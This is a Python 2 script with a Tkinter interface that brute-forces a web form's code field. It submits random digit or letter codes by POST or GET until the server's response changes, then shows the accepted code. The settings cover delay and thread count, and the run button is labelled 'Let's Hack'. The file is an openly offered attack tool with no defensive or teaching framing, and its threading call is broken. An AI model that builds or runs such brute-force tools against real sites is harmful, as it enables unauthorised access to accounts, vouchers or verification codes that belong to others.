import urllib
import urllib2
import random
import string
import time
from Tkinter import *
import thread

def randNumb(lengthCode,coder):
    code = ""
    for i in range(lengthCode):
        code += coder[random.randrange(0, len(coder))]
    return code

def setOptions():
    method = methodData.get()
    action = actionData.get()
    lenght = int(lengthData.get())
    codeId = codeData.get()
    submitId = submitData.get()
    noAscii = justInt.get()
    noNumber = justAscii.get()
    timer = float(timerData.get())
    return method,action,lenght,codeId,submitId,noAscii,noNumber,timer

def runAttack():
    method,action,lenght,codeId,submitId,noAscii,noNumber,timer = setOptions()

    if noAscii == 1:
        coder = list(string.digits)
    elif noNumber == 1:
        coder = list(string.ascii_letters)
    else:
        coder = list(string.ascii_letters+string.digits)

    url = action
    errorPage = ""
    counter = 0
    while True:
        code = randNumb(lenght,coder)
        values = {codeId : code,
                submitId: 'test'}

        data = urllib.urlencode(values)
        if method == "POST":
            req = urllib2.Request(url, data)
            response = urllib2.urlopen(req)
        else:
            response = urllib2.urlopen(url+'?'+data)
        thePage = response.read()
        if counter == 0:
            errorPage = thePage
            counter += 1
        if thePage != errorPage:
            print code
            successData.insert(0,code)
            break
        else:
            print code
            time.sleep(timer)

    return True

def main():
    try:
        treadNumber = int(threadData.get())
        for i in range(treadNumber):
            thread.start_new_thread(runAttack())
    except:
        print "Success"

window1 = Tk()

methodLabel = Label(window1, text='Method(POST/GET):')
methodLabel.grid(row=0)
methodData = Entry(window1)
methodData.grid(row=0,column=1)

actionLabel = Label(window1, text='Action:')
actionLabel.grid(row=1)
actionData = Entry(window1)
actionData.grid(row=1,column=1)

lengthLabel = Label(window1, text='Code length:')
lengthLabel.grid(row=2)
lengthData = Entry(window1)
lengthData.grid(row=2,column=1)

codeLabel = Label(window1, text='Code Id:')
codeLabel.grid(row=3)
codeData = Entry(window1)
codeData.grid(row=3,column=1)

submitLabel = Label(window1, text='Submit Id:')
submitLabel.grid(row=4)
submitData = Entry(window1)
submitData.grid(row=4,column=1)


justInt = IntVar()
justAscii = IntVar()
onlyInt = Checkbutton(window1, text='Only Int', variable = justInt)
onlyInt.grid(row=5,column=0)
onlyAscii = Checkbutton(window1, text='Only Ascii', variable = justAscii)
onlyAscii.grid(row=5,column=1)

timerLabel = Label(window1, text="Timer(ms):")
timerLabel.grid(row=6)
timerData = Entry(window1)
timerData.grid(row=6,column=1)

threadLabel = Label(window1, text="Thread Number: ")
threadLabel.grid(row=7)
threadData = Entry(window1)
threadData.grid(row=7,column=1)


buttonRun = Button(window1, text="Let's Hack", command=main)
buttonRun.grid(row=8)



successLabel = Label(window1, text='Success Code:')
successLabel.grid(row=9)
successData = Entry(window1)
successData.grid(row=9,column=1)

buttonRun = Button(window1, text="Exit", command=window1.destroy)
buttonRun.grid(row=10)


window1.mainloop()
